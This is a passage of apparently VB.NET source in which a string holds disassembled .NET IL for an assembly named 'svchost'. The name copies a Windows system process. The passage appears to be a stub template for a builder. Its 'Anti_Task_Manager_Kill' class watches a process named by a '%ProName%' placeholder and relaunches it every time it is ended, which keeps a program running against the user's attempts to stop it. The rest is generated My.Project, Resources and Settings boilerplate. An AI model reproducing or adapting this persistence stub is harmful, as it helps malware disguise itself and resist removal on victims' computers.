"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> svchost.My.MyProject::m_UserObjectProvider"& vbNewLine & _
"    IL_0006:  callvirt   instance !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()"& vbNewLine & _
"    IL_000b:  stloc.0"& vbNewLine & _
"    IL_000c:  br.s       IL_000e"& vbNewLine & _
""& vbNewLine & _
"    IL_000e:  ldloc.0"& vbNewLine & _
"    IL_000f:  ret"& vbNewLine & _
"  } // end of method MyProject::get_User"& vbNewLine & _
""& vbNewLine & _
"  .method assembly specialname static class svchost.My.MyProject/MyWebServices "& vbNewLine & _
"          get_WebServices() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       16 (0x10)"& vbNewLine & _
"    .maxstack  1"& vbNewLine & _
"    .locals init (class svchost.My.MyProject/MyWebServices V_0)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices> svchost.My.MyProject::m_MyWebServicesObjectProvider"& vbNewLine & _
"    IL_0006:  callvirt   instance !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices>::get_GetInstance()"& vbNewLine & _
"    IL_000b:  stloc.0"& vbNewLine & _
"    IL_000c:  br.s       IL_000e"& vbNewLine & _
""& vbNewLine & _
"    IL_000e:  ldloc.0"& vbNewLine & _
"    IL_000f:  ret"& vbNewLine & _
"  } // end of method MyProject::get_WebServices"& vbNewLine & _
""& vbNewLine & _
"  .property class svchost.My.MyComputer Computer()"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer.."& vbNewLine & _
"    .get class svchost.My.MyComputer svchost.My.MyProject::get_Computer()"& vbNewLine & _
"  } // end of property MyProject::Computer"& vbNewLine & _
"  .property class svchost.My.MyApplication"& vbNewLine & _
"          Application()"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio"& vbNewLine & _
"                                                                                                       6E 00 00 )                                        // n.."& vbNewLine & _
"    .get class svchost.My.MyApplication svchost.My.MyProject::get_Application()"& vbNewLine & _
"  } // end of property MyProject::Application"& vbNewLine & _
"  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User"& vbNewLine & _
"          User()"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User.."& vbNewLine & _
"    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User svchost.My.MyProject::get_User()"& vbNewLine & _
"  } // end of property MyProject::User"& vbNewLine & _
"  .property class svchost.My.MyProject/MyWebServices"& vbNewLine & _
"          WebServices()"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService"& vbNewLine & _
"                                                                                                       73 00 00 )                                        // s.."& vbNewLine & _
"    .get class svchost.My.MyProject/MyWebServices svchost.My.MyProject::get_WebServices()"& vbNewLine & _
"  } // end of property MyProject::WebServices"& vbNewLine & _
"} // end of class svchost.My.MyProject"& vbNewLine & _
""& vbNewLine & _
".class public auto ansi beforefieldinit svchost.Anti_Task_Manager_Kill"& vbNewLine & _
"       extends [mscorlib]System.Object"& vbNewLine & _
"{"& vbNewLine & _
"  .field public static string PRO_Name"& vbNewLine & _
"  .method private specialname rtspecialname static "& vbNewLine & _
"          void  .cctor() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       12 (0xc)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  ldstr      ""%ProName%"""& vbNewLine & _
"    IL_0005:  stsfld     string svchost.Anti_Task_Manager_Kill::PRO_Name"& vbNewLine & _
"    IL_000a:  nop"& vbNewLine & _
"    IL_000b:  ret"& vbNewLine & _
"  } // end of method Anti_Task_Manager_Kill::.cctor"& vbNewLine & _
""& vbNewLine & _
"  .method public specialname rtspecialname "& vbNewLine & _
"          instance void  .ctor() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       9 (0x9)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  ldarg.0"& vbNewLine & _
"    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()"& vbNewLine & _
"    IL_0006:  nop"& vbNewLine & _
"    IL_0007:  nop"& vbNewLine & _
"    IL_0008:  ret"& vbNewLine & _
"  } // end of method Anti_Task_Manager_Kill::.ctor"& vbNewLine & _
""& vbNewLine & _
"  .method public static void  Main() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .entrypoint"& vbNewLine & _
"    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       14 (0xe)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldsfld     string svchost.Anti_Task_Manager_Kill::PRO_Name"& vbNewLine & _
"    IL_0006:  call       void svchost.AntiTaskManagerKill::GetPro(string)"& vbNewLine & _
"    IL_000b:  nop"& vbNewLine & _
"    IL_000c:  nop"& vbNewLine & _
"    IL_000d:  ret"& vbNewLine & _
"  } // end of method Anti_Task_Manager_Kill::Main"& vbNewLine & _
""& vbNewLine & _
"} // end of class svchost.Anti_Task_Manager_Kill"& vbNewLine & _
""& vbNewLine & _
".class private auto ansi sealed svchost.AntiTaskManagerKill"& vbNewLine & _
"       extends [mscorlib]System.Object"& vbNewLine & _
"{"& vbNewLine & _
"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .field private static class [System]System.Diagnostics.Process[] ProList"& vbNewLine & _
"  .method public static void  GetPro(string Proc) cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       123 (0x7b)"& vbNewLine & _
"    .maxstack  3"& vbNewLine & _
"    .locals init (string V_0,"& vbNewLine & _
"             class [System]System.Diagnostics.Process V_1,"& vbNewLine & _
"             class [System]System.ComponentModel.Win32Exception V_2,"& vbNewLine & _
"             int32 V_3,"& vbNewLine & _
"             class [System]System.Diagnostics.Process[] V_4,"& vbNewLine & _
"             bool V_5)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  nop"& vbNewLine & _
"    IL_0002:  nop"& vbNewLine & _
"    IL_0003:  ldarg.0"& vbNewLine & _
"    IL_0004:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)"& vbNewLine & _
"    IL_0009:  stloc.s    V_4"& vbNewLine & _
"    IL_000b:  ldc.i4.0"& vbNewLine & _
"    IL_000c:  stloc.3"& vbNewLine & _
"    IL_000d:  br.s       IL_005a"& vbNewLine & _
""& vbNewLine & _
"    IL_000f:  ldloc.s    V_4"& vbNewLine & _
"    IL_0011:  ldloc.3"& vbNewLine & _
"    IL_0012:  ldelem.ref"& vbNewLine & _
"    IL_0013:  stloc.1"& vbNewLine & _
"    IL_0014:  nop"& vbNewLine & _
"    .try"& vbNewLine & _
"    {"& vbNewLine & _
"      IL_0015:  ldloc.1"& vbNewLine & _
"      IL_0016:  callvirt   instance class [System]System.Diagnostics.ProcessModuleCollection [System]System.Diagnostics.Process::get_Modules()"& vbNewLine & _
"      IL_001b:  ldc.i4.0"& vbNewLine & _
"      IL_001c:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.ProcessModuleCollection::get_Item(int32)"& vbNewLine & _
"      IL_0021:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()"& vbNewLine & _
"      IL_0026:  stloc.0"& vbNewLine & _
"      IL_0027:  leave.s    IL_004c"& vbNewLine & _
""& vbNewLine & _
"    }  // end .try"& vbNewLine & _
"    catch [System]System.ComponentModel.Win32Exception "& vbNewLine & _
"    {"& vbNewLine & _
"      IL_0029:  dup"& vbNewLine & _
"      IL_002a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)"& vbNewLine & _
"      IL_002f:  stloc.2"& vbNewLine & _
"      IL_0030:  nop"& vbNewLine & _
"      IL_0031:  ldstr      ""n/a"""& vbNewLine & _
"      IL_0036:  stloc.0"& vbNewLine & _
"      IL_0037:  ldloc.2"& vbNewLine & _
"      IL_0038:  callvirt   instance string [mscorlib]System.Exception::ToString()"& vbNewLine & _
"      IL_003d:  ldc.i4.0"& vbNewLine & _
"      IL_003e:  ldnull"& vbNewLine & _
"      IL_003f:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,"& vbNewLine & _
"                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,"& vbNewLine & _
"                                                                                                                                                                object)"& vbNewLine & _
"      IL_0044:  pop"& vbNewLine & _
"      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()"& vbNewLine & _
"      IL_004a:  leave.s    IL_004c"& vbNewLine & _
""& vbNewLine & _
"    }  // end handler"& vbNewLine & _
"    IL_004c:  nop"& vbNewLine & _
"    IL_004d:  ldloc.0"& vbNewLine & _
"    IL_004e:  ldarg.0"& vbNewLine & _
"    IL_004f:  call       void svchost.AntiTaskManagerKill::CheckRun(string,"& vbNewLine & _
"                                                                    string)"& vbNewLine & _
"    IL_0054:  nop"& vbNewLine & _
"    IL_0055:  ldloc.3"& vbNewLine & _
"    IL_0056:  ldc.i4.1"& vbNewLine & _
"    IL_0057:  add.ovf"& vbNewLine & _
"    IL_0058:  stloc.3"& vbNewLine & _
"    IL_0059:  nop"& vbNewLine & _
"    IL_005a:  ldloc.3"& vbNewLine & _
"    IL_005b:  ldloc.s    V_4"& vbNewLine & _
"    IL_005d:  ldlen"& vbNewLine & _
"    IL_005e:  conv.ovf.i4"& vbNewLine & _
"    IL_005f:  clt"& vbNewLine & _
"    IL_0061:  stloc.s    V_5"& vbNewLine & _
"    IL_0063:  ldloc.s    V_5"& vbNewLine & _
"    IL_0065:  brtrue.s   IL_000f"& vbNewLine & _
""& vbNewLine & _
"    IL_0067:  ldstr      ""1000"""& vbNewLine & _
"    IL_006c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)"& vbNewLine & _
"    IL_0071:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)"& vbNewLine & _
"    IL_0076:  nop"& vbNewLine & _
"    IL_0077:  br.s       IL_0002"& vbNewLine & _
""& vbNewLine & _
"    IL_0079:  nop"& vbNewLine & _
"    IL_007a:  ret"& vbNewLine & _
"  } // end of method AntiTaskManagerKill::GetPro"& vbNewLine & _
""& vbNewLine & _
"  .method private static void  CheckRun(string Path,"& vbNewLine & _
"                                        string Proc) cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       77 (0x4d)"& vbNewLine & _
"    .maxstack  2"& vbNewLine & _
"    .locals init (class [System]System.Diagnostics.ProcessStartInfo V_0,"& vbNewLine & _
"             bool V_1)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  br.s       IL_0046"& vbNewLine & _
""& vbNewLine & _
"    IL_0003:  ldarg.1"& vbNewLine & _
"    IL_0004:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)"& vbNewLine & _
"    IL_0009:  stsfld     class [System]System.Diagnostics.Process[] svchost.AntiTaskManagerKill::ProList"& vbNewLine & _
"    IL_000e:  ldsfld     class [System]System.Diagnostics.Process[] svchost.AntiTaskManagerKill::ProList"& vbNewLine & _
"    IL_0013:  ldlen"& vbNewLine & _
"    IL_0014:  conv.ovf.i4"& vbNewLine & _
"    IL_0015:  ldc.i4.0"& vbNewLine & _
"    IL_0016:  cgt"& vbNewLine & _
"    IL_0018:  stloc.1"& vbNewLine & _
"    IL_0019:  ldloc.1"& vbNewLine & _
"    IL_001a:  brfalse.s  IL_002e"& vbNewLine & _
""& vbNewLine & _
"    IL_001c:  ldstr      ""3000"""& vbNewLine & _
"    IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)"& vbNewLine & _
"    IL_0026:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)"& vbNewLine & _
"    IL_002b:  nop"& vbNewLine & _
"    IL_002c:  br.s       IL_0044"& vbNewLine & _
""& vbNewLine & _
"    IL_002e:  nop"& vbNewLine & _
"    IL_002f:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()"& vbNewLine & _
"    IL_0034:  stloc.0"& vbNewLine & _
"    IL_0035:  ldloc.0"& vbNewLine & _
"    IL_0036:  ldarg.0"& vbNewLine & _
"    IL_0037:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)"& vbNewLine & _
"    IL_003c:  nop"& vbNewLine & _
"    IL_003d:  ldloc.0"& vbNewLine & _
"    IL_003e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)"& vbNewLine & _
"    IL_0043:  pop"& vbNewLine & _
"    IL_0044:  nop"& vbNewLine & _
"    IL_0045:  nop"& vbNewLine & _
"    IL_0046:  ldc.i4.1"& vbNewLine & _
"    IL_0047:  stloc.1"& vbNewLine & _
"    IL_0048:  ldloc.1"& vbNewLine & _
"    IL_0049:  brtrue.s   IL_0003"& vbNewLine & _
""& vbNewLine & _
"    IL_004b:  nop"& vbNewLine & _
"    IL_004c:  ret"& vbNewLine & _
"  } // end of method AntiTaskManagerKill::CheckRun"& vbNewLine & _
""& vbNewLine & _
"} // end of class svchost.AntiTaskManagerKill"& vbNewLine & _
""& vbNewLine & _
".class private auto ansi sealed svchost.My.Resources.Resources"& vbNewLine & _
"       extends [mscorlib]System.Object"& vbNewLine & _
"{"& vbNewLine & _
"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,"& vbNewLine & _
"                                                                                      string) = ( 01 00 33 53 79 73 74 65 6D 2E 52 65 73 6F 75 72   // ..3System.Resour"& vbNewLine & _
"                                                                                                  63 65 73 2E 54 6F 6F 6C 73 2E 53 74 72 6F 6E 67   // ces.Tools.Strong"& vbNewLine & _
"                                                                                                  6C 79 54 79 70 65 64 52 65 73 6F 75 72 63 65 42   // lyTypedResourceB"& vbNewLine & _
"                                                                                                  75 69 6C 64 65 72 07 34 2E 30 2E 30 2E 30 00 00 ) // uilder.4.0.0.0.."& vbNewLine & _
"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .field private static class [mscorlib]System.Resources.ResourceManager resourceMan"& vbNewLine & _
"  .field private static class [mscorlib]System.Globalization.CultureInfo resourceCulture"& vbNewLine & _
"  .method assembly specialname static class [mscorlib]System.Resources.ResourceManager "& vbNewLine & _
"          get_ResourceManager() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       59 (0x3b)"& vbNewLine & _
"    .maxstack  2"& vbNewLine & _
"    .locals init (class [mscorlib]System.Resources.ResourceManager V_0,"& vbNewLine & _
"             class [mscorlib]System.Resources.ResourceManager V_1,"& vbNewLine & _
"             bool V_2)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldsfld     class [mscorlib]System.Resources.ResourceManager svchost.My.Resources.Resources::resourceMan"& vbNewLine & _
"    IL_0006:  ldnull"& vbNewLine & _
"    IL_0007:  call       bool [mscorlib]System.Object::ReferenceEquals(object,"& vbNewLine & _
"                                                                       object)"& vbNewLine & _
"    IL_000c:  stloc.2"& vbNewLine & _
"    IL_000d:  ldloc.2"& vbNewLine & _
"    IL_000e:  brfalse.s  IL_0030"& vbNewLine & _
""& vbNewLine & _
"    IL_0010:  ldstr      ""svchost.Resources"""& vbNewLine & _
"    IL_0015:  ldtoken    svchost.My.Resources.Resources"& vbNewLine & _
"    IL_001a:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)"& vbNewLine & _
"    IL_001f:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Type::get_Assembly()"& vbNewLine & _
"    IL_0024:  newobj     instance void [mscorlib]System.Resources.ResourceManager::.ctor(string,"& vbNewLine & _
"                                                                                         class [mscorlib]System.Reflection.Assembly)"& vbNewLine & _
"    IL_0029:  stloc.1"& vbNewLine & _
"    IL_002a:  ldloc.1"& vbNewLine & _
"    IL_002b:  stsfld     class [mscorlib]System.Resources.ResourceManager svchost.My.Resources.Resources::resourceMan"& vbNewLine & _
"    IL_0030:  nop"& vbNewLine & _
"    IL_0031:  ldsfld     class [mscorlib]System.Resources.ResourceManager svchost.My.Resources.Resources::resourceMan"& vbNewLine & _
"    IL_0036:  stloc.0"& vbNewLine & _
"    IL_0037:  br.s       IL_0039"& vbNewLine & _
""& vbNewLine & _
"    IL_0039:  ldloc.0"& vbNewLine & _
"    IL_003a:  ret"& vbNewLine & _
"  } // end of method Resources::get_ResourceManager"& vbNewLine & _
""& vbNewLine & _
"  .method assembly specialname static class [mscorlib]System.Globalization.CultureInfo "& vbNewLine & _
"          get_Culture() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       11 (0xb)"& vbNewLine & _
"    .maxstack  1"& vbNewLine & _
"    .locals init (class [mscorlib]System.Globalization.CultureInfo V_0)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldsfld     class [mscorlib]System.Globalization.CultureInfo svchost.My.Resources.Resources::resourceCulture"& vbNewLine & _
"    IL_0006:  stloc.0"& vbNewLine & _
"    IL_0007:  br.s       IL_0009"& vbNewLine & _
""& vbNewLine & _
"    IL_0009:  ldloc.0"& vbNewLine & _
"    IL_000a:  ret"& vbNewLine & _
"  } // end of method Resources::get_Culture"& vbNewLine & _
""& vbNewLine & _
"  .method assembly specialname static void "& vbNewLine & _
"          set_Culture(class [mscorlib]System.Globalization.CultureInfo Value) cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       9 (0x9)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldarg.0"& vbNewLine & _
"    IL_0002:  stsfld     class [mscorlib]System.Globalization.CultureInfo svchost.My.Resources.Resources::resourceCulture"& vbNewLine & _
"    IL_0007:  nop"& vbNewLine & _
"    IL_0008:  ret"& vbNewLine & _
"  } // end of method Resources::set_Culture"& vbNewLine & _
""& vbNewLine & _
"  .property class [mscorlib]System.Resources.ResourceManager"& vbNewLine & _
"          ResourceManager()"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) "& vbNewLine & _
"    .get class [mscorlib]System.Resources.ResourceManager svchost.My.Resources.Resources::get_ResourceManager()"& vbNewLine & _
"  } // end of property Resources::ResourceManager"& vbNewLine & _
"  .property class [mscorlib]System.Globalization.CultureInfo"& vbNewLine & _
"          Culture()"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) "& vbNewLine & _
"    .set void svchost.My.Resources.Resources::set_Culture(class [mscorlib]System.Globalization.CultureInfo)"& vbNewLine & _
"    .get class [mscorlib]System.Globalization.CultureInfo svchost.My.Resources.Resources::get_Culture()"& vbNewLine & _
"  } // end of property Resources::Culture"& vbNewLine & _
"} // end of class svchost.My.Resources.Resources"& vbNewLine & _
""& vbNewLine & _
".class private auto ansi sealed beforefieldinit svchost.My.MySettings"& vbNewLine & _
"       extends [System]System.Configuration.ApplicationSettingsBase"& vbNewLine & _
"{"& vbNewLine & _
"  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) "& vbNewLine & _
"  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,"& vbNewLine & _
"                                                                                      string) = ( 01 00 4B 4D 69 63 72 6F 73 6F 66 74 2E 56 69 73   // ..KMicrosoft.Vis"& vbNewLine & _
"                                                                                                  75 61 6C 53 74 75 64 69 6F 2E 45 64 69 74 6F 72   // ualStudio.Editor"& vbNewLine & _
"                                                                                                  73 2E 53 65 74 74 69 6E 67 73 44 65 73 69 67 6E   // s.SettingsDesign"& vbNewLine & _
"                                                                                                  65 72 2E 53 65 74 74 69 6E 67 73 53 69 6E 67 6C   // er.SettingsSingl"& vbNewLine & _
"                                                                                                  65 46 69 6C 65 47 65 6E 65 72 61 74 6F 72 08 31   // eFileGenerator.1"& vbNewLine & _
"                                                                                                  31 2E 30 2E 30 2E 30 00 00 )                      // 1.0.0.0.."& vbNewLine & _
"  .field private static class svchost.My.MySettings defaultInstance"& vbNewLine & _
"  .method private specialname rtspecialname static "& vbNewLine & _
"          void  .cctor() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       22 (0x16)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  newobj     instance void svchost.My.MySettings::.ctor()"& vbNewLine & _
"    IL_0005:  call       class [System]System.Configuration.SettingsBase [System]System.Configuration.SettingsBase::Synchronized(class [System]System.Configuration.SettingsBase)"& vbNewLine & _
"    IL_000a:  castclass  svchost.My.MySettings"& vbNewLine & _
"    IL_000f:  stsfld     class svchost.My.MySettings svchost.My.MySettings::defaultInstance"& vbNewLine & _
"    IL_0014:  nop"& vbNewLine & _
"    IL_0015:  ret"& vbNewLine & _
"  } // end of method MySettings::.cctor"& vbNewLine & _
""& vbNewLine & _
"  .method public specialname rtspecialname "& vbNewLine & _
"          instance void  .ctor() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       9 (0x9)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  ldarg.0"& vbNewLine & _
"    IL_0001:  call       instance void [System]System.Configuration.ApplicationSettingsBase::.ctor()"& vbNewLine & _
"    IL_0006:  nop"& vbNewLine & _
"    IL_0007:  nop"& vbNewLine & _
"    IL_0008:  ret"& vbNewLine & _
"  } // end of method MySettings::.ctor"& vbNewLine & _
""& vbNewLine & _
"  .method public specialname static class svchost.My.MySettings "& vbNewLine & _
"          get_Default() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       11 (0xb)"& vbNewLine & _
"    .maxstack  1"& vbNewLine & _
"    .locals init (class svchost.My.MySettings V_0)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldsfld     class svchost.My.MySettings svchost.My.MySettings::defaultInstance"& vbNewLine & _
"    IL_0006:  stloc.0"& vbNewLine & _
"    IL_0007:  br.s       IL_0009"& vbNewLine & _
""& vbNewLine & _
"    IL_0009:  ldloc.0"& vbNewLine & _
"    IL_000a:  ret"& vbNewLine & _
"  } // end of method MySettings::get_Default"& vbNewLine & _
""& vbNewLine & _
"  .property class svchost.My.MySettings Default()"& vbNewLine & _
"  {"& vbNewLine & _
"    .get class svchost.My.MySettings svchost.My.MySettings::get_Default()"& vbNewLine & _
"  } // end of property MySettings::Default"& vbNewLine & _
"} // end of class svchost.My.MySettings"& vbNewLine & _
""& vbNewLine & _
".class private auto ansi sealed svchost.My.MySettingsProperty"& vbNewLine & _
"       extends [mscorlib]System.Object"& vbNewLine & _
"{"& vbNewLine & _
"  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .method assembly specialname static class svchost.My.MySettings "& vbNewLine & _
"          get_Settings() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    // Code size       11 (0xb)"& vbNewLine & _
"    .maxstack  1"& vbNewLine & _
"    .locals init (class svchost.My.MySettings V_0)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  call       class svchost.My.MySettings svchost.My.MySettings::get_Default()"& vbNewLine & _
"    IL_0006:  stloc.0"& vbNewLine & _
"    IL_0007:  br.s       IL_0009"& vbNewLine & _
""& vbNewLine & _
"    IL_0009:  ldloc.0"& vbNewLine & _
"    IL_000a:  ret"& vbNewLine & _
"  } // end of method MySettingsProperty::get_Settings"& vbNewLine & _
""& vbNewLine & _
"  .property class svchost.My.MySettings Settings()"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 53 65 74 74 69 6E 67 73 00 00 ) // ...My.Settings.."& vbNewLine & _
"    .get class svchost.My.MySettings svchost.My.MySettingsProperty::get_Settings()"& vbNewLine & _
"  } // end of property MySettingsProperty::Settings"& vbNewLine & _
"} // end of class svchost.My.MySettingsProperty"& vbNewLine & _
""& vbNewLine & _
""& vbNewLine & _
"// ============================================================="& vbNewLine & _
""& vbNewLine & _
"// *********** DISASSEMBLY COMPLETE ***********************"
End Class
